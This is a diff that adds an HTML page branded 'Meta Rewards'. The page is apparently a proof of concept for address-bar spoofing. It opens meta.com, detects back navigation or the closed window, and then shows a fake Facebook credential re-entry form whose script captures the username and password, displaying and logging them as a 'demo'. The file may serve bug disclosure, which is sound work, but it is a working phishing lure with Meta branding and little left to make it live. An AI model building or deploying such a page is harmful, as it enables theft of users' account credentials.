@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Meta Rewards</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #fff;
+      text-align: center;
+    }
+
+    .box {
+      max-width: 420px;
+      padding: 32px;
+    }
+
+    h1 {
+      color: #1877f2;
+      margin-bottom: 12px;
+    }
+
+    p {
+      color: #666;
+      margin-bottom: 24px;
+    }
+
+    button {
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .panel {
+      margin-top: 24px;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      background: #fafafa;
+    }
+
+    .warning {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .info {
+      font-size: 13px;
+      color: #444;
+      margin-top: 10px;
+    }
+
+    input {
+      padding: 8px;
+      width: 90%;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="box">
+
+    <!-- Initial -->
+    <div id="initialContent">
+      <h1>Meta Rewards Website</h1>
+      <p>
+        Click the button below to proceed to meta.com, then press the back button to claim your reward.
+      </p>
+      <button onclick="runPoC()">Click Here</button>
+    </div>
+
+    <!-- Phishing -->
+    <div id="phishContent" class="panel" style="display:none;">
+
+      <div class="warning">
+        ⚠️ This is NOT meta.com, but the address bar shows meta.com
+      </div>
+
+      <h3>Security Verification Required</h3>
+
+      <p>Please re-enter your Facebook credentials to continue.</p>
+
+      <form onsubmit="stealCreds(event)">
+        <div>
+          <label>Email / Username</label><br />
+          <input type="text" id="username" required />
+        </div>
+
+        <div style="margin-top:10px;">
+          <label>Password</label><br />
+          <input type="password" id="password" required />
+        </div>
+
+        <div style="margin-top:15px;">
+          <button type="submit">Submit</button>
+        </div>
+      </form>
+
+      <div id="result" style="margin-top:10px;"></div>
+
+      <!-- Proof -->
+      <div class="info">
+        Address Bar: <b>meta.com</b><br>
+        Real Origin: <span id="origin"></span>
+      </div>
+
+    </div>
+
+  </div>
+
+  <script>
+    let spoofWindow = null;
+
+    function runPoC() {
+      spoofWindow = window.open("https://www.meta.com", "_blank");
+
+      const check = setInterval(() => {
+        if (spoofWindow && spoofWindow.closed) {
+          clearInterval(check);
+          showPhish();
+        }
+      }, 500);
+    }
+
+    function showPhish() {
+      document.getElementById("initialContent").style.display = "none";
+      document.getElementById("phishContent").style.display = "block";
+      document.getElementById("origin").innerText = window.location.origin;
+    }
+
+    function stealCreds(e) {
+      e.preventDefault();
+
+      const u = document.getElementById("username").value;
+      const p = document.getElementById("password").value;
+
+      document.getElementById("result").innerHTML =
+        `<b style="color:green;">Captured (Demo):</b><br>${u}<br>${p}`;
+
+      console.log("Captured:", u, p);
+    }
+
+    // detect back navigation
+    window.addEventListener("pageshow", function (event) {
+      if (
+        event.persisted ||
+        (performance.getEntriesByType("navigation")[0] &&
+          performance.getEntriesByType("navigation")[0].type === "back_forward")
+      ) {
+        showPhish();
+      }
+    });
+  </script>
+</body>
+</html>
